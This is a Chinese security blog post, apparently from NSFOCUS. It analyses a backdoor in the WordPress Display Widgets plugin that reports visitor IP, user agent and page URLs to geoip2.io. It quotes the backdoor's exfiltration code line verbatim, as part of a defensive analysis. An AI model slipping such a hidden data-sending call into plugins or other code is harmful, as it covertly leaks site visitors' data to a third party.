---
title: WordPress的Display Widgets插件后门分析
date: 2017-09-15 15:30:47
tags: web漏洞分析
categories: 技术
---

![](http://blog.nsfocus.net/wp-content/uploads/2017/09/wordpress.png)

Display Widgets是WordPress一款插件，大约有200,000站点在使用该插件。最近，Display Widgets被发现存在有后门代码。该后门用于上传数据到第三方服务器，上传的数据包括用户IP地址，UA标识等。本文是对此后门的技术分析。

<!--more-->

## 后门分析

Display Widgets安装后如下图

** ![](http://blog.nsfocus.net/wp-content/uploads/2017/09/6f7efd8d362095b06add06300699d152.png)**

在没有安装Display Widgets插件，Widgets原来的样子

![](http://blog.nsfocus.net/wp-content/uploads/2017/09/e2509aac2db597ea58b6aef3546c9d0c.png)

Display Widgets插件开启后的样子

![](http://blog.nsfocus.net/wp-content/uploads/2017/09/40ef6b1571d2a66c88c48e2755e85553.png)

Display Widgets插件扩展了小工具的功能.

虽然这个插件是在后台进行操作配置的，但是我们在浏览wordpress前端网页时，这个插件仍然可被加载.

我们访问一下wordpress文章页面，并在后门处下断

![](http://blog.nsfocus.net/wp-content/uploads/2017/09/1a0f108099c56002441f725d7804acb2.png)

![](http://blog.nsfocus.net/wp-content/uploads/2017/09/70a49c9b17f9418d5234db3e3aee3fab.png)

在后门文件上下断点，访问前端文章页面，被断下，证明此时后门已经加载了。

下面我们分析下这个后门。

这个后门文件名为geolocation.php，在插件安装后位于wp-content/plugins/display-widgets/文件夹中

发现代码中有多处wp_remote_get()方法：

![](http://blog.nsfocus.net/wp-content/uploads/2017/09/a100bea80b8b74c45ae65fb027a3007c.png)

这个方法是用来向外发送get请求的，如下图所示：

![](http://blog.nsfocus.net/wp-content/uploads/2017/09/9ab6c5489de13641cece3f0546cf1c21.png)

而且插件代码调用这个方法向外发送一个可疑的request_url参数，

![](http://blog.nsfocus.net/wp-content/uploads/2017/09/53782c0d853c4929930720b1f985d95f.png)

$request_url = 'http://geoip2.io/api/update/?url=' . _urlencode_( self::get_protocol() . $_SERVER[ 'HTTP_HOST' ] . $_SERVER[ 'REQUEST_URI' ] ) . '&amp;agent=' . _urlencode_( self::get_user_agent() ) . '&amp;geo=true&amp;p=9&amp;v=0&amp;ip=' . _urlencode_( $_SERVER[ 'REMOTE_ADDR' ] ) . '&amp;siteurl=' . _urlencode_( get_site_url() );

因此这处怀疑是一处后门。

我们分析下这个request_url参数都向外发送了什么，下面具体分析下：

![](http://blog.nsfocus.net/wp-content/uploads/2017/09/50af7f673213b16417f0aa6290d2ec02.png)

request_url这个参数拼接了一个地址，并向这个地址通过get主要提交了url参数、agent参数和siteurl参数。

我们看一下这三个参数中泄露了什么信息

**先看url****参数中：**

![](http://blog.nsfocus.net/wp-content/uploads/2017/09/f22cb75bb40b49ed3ee4ab06f71c4e4b.png)

参数中的第一处调用了get_protocol()方法，，我们看下get_protocol方法，如下所示：

![](http://blog.nsfocus.net/wp-content/uploads/2017/09/0bc903e80ce4d5ee28a9757324f5c8fe.png)

这个方法是用来判断网址是否是https的

然后紧接着拼接了一个$_SERVER[ 'HTTP_HOST' ] 和$_SERVER[ 'REQUEST_URI' ]组成了url参数

**再看agent****参数中：**

![](http://blog.nsfocus.net/wp-content/uploads/2017/09/87af809283644f1b9a86d5d0e17ee9f3.png)

包含了user_agent和$_SERVER[ 'REMOTE_ADDR' ]

get_user_agent方法如下所示，这个方法返回了$_SERVER[ 'HTTP_USER_AGENT' ] 的值

![](http://blog.nsfocus.net/wp-content/uploads/2017/09/0c4c0b4eeea0b2faef852eead31568cb.png)

**最后看siteurl****参数中：**

![](http://blog.nsfocus.net/wp-content/uploads/2017/09/1163b4162e19a41a6f663fbe050350bd.png)

包含了网站的地址。

这些信息最终通过wp_remote_get方法被发送给了[http://geoip2.io](http://geoip2.io)这个站，如下图所示

![](http://blog.nsfocus.net/wp-content/uploads/2017/09/bb3fe8542d80a2a0a86ba92d1b5b2a4d.png)

那代码中一共有多少处发送请求的地方呢？

一共用三处，这三处发送的内容一样，就是上文所分析的内容。

首先第一处在get_country方法

![](http://blog.nsfocus.net/wp-content/uploads/2017/09/eddf14e841860555304ff5cadd78721c.png)

这个方法在display-widgets.php（插件主文件）中show_geolocation方法中被使用

![](http://blog.nsfocus.net/wp-content/uploads/2017/09/c82dd71a1726ca6ffe3156832907b5fd.png)

第二处、第三次都在在check_query_string方法中，如下代码：

![](http://blog.nsfocus.net/wp-content/uploads/2017/09/4ff5ad5b8ebf19cc55149c3618abf715.png)

![](http://blog.nsfocus.net/wp-content/uploads/2017/09/344972d15831b3a29c45032474463074.png)

check_query_string方法在wp动作执行时被触发时被调用，如下图

![](http://blog.nsfocus.net/wp-content/uploads/2017/09/1ab63e04e1bf5d775326d93c16401bf0.png)

而Wp动作意思是在wp项目被启动

![](http://blog.nsfocus.net/wp-content/uploads/2017/09/69b8e0ee6fc49c154ba441dfd405fd8f.png)

另外，这个文件中还有个get_remote_ip方法，但是这个并没有被调用，

![](http://blog.nsfocus.net/wp-content/uploads/2017/09/126a377ea229d9dba12e9980931ce2b0.png)

&nbsp;

虽然没有被调用，但仍然可以看出这个方法是返回$_SERVER[ 'REMOTE_ADDR' ]值用的，如下图，因为是本地测试，值是127.0.0.1

![](http://blog.nsfocus.net/wp-content/uploads/2017/09/615866e907208464e0dd84ce681b9984.png)

## <span id="i-14" class="ez-toc-section">声 明</span>

本安全公告仅用来描述可能存在的安全问题，绿盟科技不为此安全公告提供任何保证或承诺。由于传播、利用此安全公告所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，绿盟科技以及安全公告作者不为此承担任何责任。绿盟科技拥有对此安全公告的修改和解释权。如欲转载或传播此安全公告，必须保证此安全公告的完整性，包括版权声明等全部内容。未经绿盟科技允许，不得任意修改或者增减此安全公告内容，不得以任何方式将其用于商业目的。

## <span id="i-15" class="ez-toc-section">关于绿盟科技</span>

北京神州绿盟信息安全科技股份有限公司（简称绿盟科技）成立于2000年4月，总部位于北京。在国内外设有30多个分支机构，为政府、运营商、金融、能源、互联网以及教育、医疗等行业用户，提供具有核心竞争力的安全产品及解决方案，帮助客户实现业务的安全顺畅运行。

基于多年的安全攻防研究，绿盟科技在网络及终端安全、互联网基础安全、合规及安全管理等领域，为客户提供入侵检测/防护、抗拒绝服务攻击、远程安全评估以及Web安全防护等产品以及专业安全服务。

北京神州绿盟信息安全科技股份有限公司于2014年1月29日起在深圳证券交易所创业板上市交易，股票简称：绿盟科技，股票代码：300369。

如果您需要了解更多内容，可以
加入QQ群：570982169
直接询问：010-68438880

&nbsp;